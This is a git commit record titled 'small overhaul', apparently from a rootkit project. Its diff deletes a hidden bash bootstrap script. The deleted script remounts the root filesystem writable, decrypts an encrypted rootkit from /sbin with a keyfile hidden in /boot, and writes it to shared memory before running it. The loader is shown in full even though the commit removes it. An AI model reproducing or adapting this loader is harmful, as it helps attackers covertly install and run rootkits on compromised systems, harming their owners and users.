0b2e382bdc529e77e3958197767f0381c32760f9
lain <tbkopera@proton.me>
2025-05-12 17:16:31 +0200

    small overhaul

--- payload/.bootstrap_script.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-mount -o remount,rw /
-openssl enc -d -aes-256-cbc -pbkdf2 -in "/sbin/script_rootkit.sh.enc" -out "/dev/shm/script_rootkit.sh" -pass file:"/boot/.keyfile.bin"
-chmod +x /dev/shm/script_rootkit.sh
-exec /dev/shm/script_rootkit.sh "$@"
